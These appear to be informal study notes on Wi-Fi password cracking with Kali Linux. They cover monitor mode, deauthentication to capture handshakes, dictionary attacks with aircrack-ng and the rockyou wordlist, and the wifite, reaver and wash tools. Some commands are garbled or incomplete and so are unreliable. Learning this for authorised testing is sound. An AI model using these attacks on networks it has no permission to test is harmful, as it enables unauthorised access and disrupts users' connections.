Site: routerpwn.com, wardriving-forum.de. In it we can google first 3 hex-digits on site wardriving-forum.de
commands: airmon-ng start wlan0
Disable all clients: aireplay -ng -0 2 -a 14 DA E9 82 49 CC mon0 --ignore-negative-one. Tries to disconnect all clients,
they automatically try to reauth, and we can catch their handshake. Handshake - messages between router and client,
router tries understand if client knows password.
Then we try to broot using /usr/share/wordlists/rockyou.txt.gz - dictionary
We can broot : 1) using CPU (slow) 2) using GPU (good) 3) Rainbow tables (smth)
>pyrit - better to use for nvidia gpus
//man aircrack-ng
aircrack-ng -b AA:AA:..:AA -w rockyou.txt file.ivs //AA:AA:.. - point of access, that we got. Capture file, better the last file
Utilite: wifite - GOOD utility, can automize(?). Then Ctrl+C, and number of network.
or wifite -dict rockyou.txt - automatically does the same we've seen earlier.
//Another utility
>reaver
>reaver -i mon0 -b
or another utility
>wash -i mon0 -C

//Disable monitor mode airmon-ng dekstop (?)
//More dictionaries in kali: ls -la /usr/share/wordlists/
